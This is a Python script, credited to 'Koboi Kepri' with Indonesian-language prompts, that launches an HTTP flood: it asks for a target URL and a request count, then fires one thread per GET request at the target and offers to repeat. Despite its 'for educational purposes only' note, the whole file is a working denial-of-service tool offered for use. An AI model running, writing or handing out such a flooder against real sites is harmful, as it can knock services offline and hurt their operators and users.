import requests
import threading
import time
import os

def make_request(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(f"Request to {url} succeeded")
        else:
            print(f"Request to {url} failed with status code {response.status_code}")
    except Exception as e:
        print(f"An error occurred while making the request to {url}: {str(e)}")

def order_requests(num_requests, url):
    start_time = time.time()
    threads = []

    for _ in range(num_requests):
        t = threading.Thread(target=make_request, args=(url,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    end_time = time.time()
    total_time = end_time - start_time
    print(f"Total time taken for {num_requests} requests: {total_time:.2f} seconds")

def main():
    # Tampilan ASCII art
    ascii_art = """
                                           :@+                                           
                                         .*@@@@%-                                         
                                         #@@@@@@@.                                        
                                         +@@@@@@%.                                        
                                          :#@@%=                                          
                   .-.          .=*#%@@%#=. @@= -*%@@@%#+-           ::                   
                   @@+      .=*%@@@@@@@@@@@@@@@@@@@@@@@@@@@#=:      :@@=                  
                   @@#:..-+%@@@@#+++*%@@@@@@@@@@@@@@@#+++#@@@@@*=:..+@@-                  
                   :%@@@@@@@@*=.      .+@@@@@@@@@@#:       -+%@@@@@@@@+                   
                     :=+@*#@.           .#@@@@@@@-            *%*@#+-                     
                       *#  #*            .%@@@@@=            :@: -@:                      
                      +@:  .@:           =@@@@@@#            %+   #@:                     
                     =@+    =%           %@@@@@@@-          +%    .@%.                    
                    -@+      ##          -@@@@@@*          =@:     .%#                    
                   :@+       .@*         .%@@@@@-         :@-       .@*                   
                  .@*         :@-        =@@@@@@%         %+         :@+                  
                 .%%.          =@.       .@@@@@@+        *%           =@-                 
                 #%.            *%       .@@@@@@*       +@.            +@-                
                *@:              %#       #@@@@@.      -@-              #@.               
              .#@-               .@+      #@@@@@:     :@=               .%%.              
              #@:                 :@*     @@@@@@=    -@+                  #@:             
            .%@-:.....  .....:.....-@%.   @@@@@@-   =@*....:......  .....::%@-            
            =@@@@@@@@@@@@@@@@@@@@@@@@@@   @@@@@@=  +@@@@@@@@@@@@@@@@@@@@@@@@@%            
              %@@@@@@@@@@@@@@@@@@@@@@=.  +@@@@@@%   .#@@@@@@@@@@@@@@@@@@@@@@-             
              .#@@@@@@@@@@@@@@@@@@@@-   :@@@@@@@@#   .%@@@@@@@@@@@@@@@@@@@%:              
                -%@@@@@@@@@@@@@@@@*.   :@@@@@@@@@@+    =%@@@@@@@@@@@@@@@@+                
                  -#@@@@@@@@@@@#=     .@@@@@@@@@@@@+     -*@@@@@@@@@@@@+.                 
                     :-=+++=-:        %@@@@@@@@@@@@@=       .:==++=--.                    
                                      @@@@@@@@@@@@@@+                                     
                                      +@@@@@@@@@@@@@                                      
                                    :+
    
    Author: Koboi Kepri
    Note: Ini hanya untuk tujuan pendidikan.
    """

    print(ascii_art)

    while True:
        url = input("Masukkan URL target: ")
        num_requests = int(input("Masukkan jumlah target: "))

        # Menampilkan direktori saat ini
        current_directory = os.getcwd()
        print(f"Direktori saat ini: {current_directory}")

        order_requests(num_requests, url)

        repeat = input("Apakah Anda ingin memesan lagi? (y/n): ")
        if repeat.lower() != 'y':
            restart = input("Apakah Anda ingin mengirim permintaan baru? (y/n): ")
            if restart.lower() != 'y':
                break

if __name__ == "__main__":
    main()
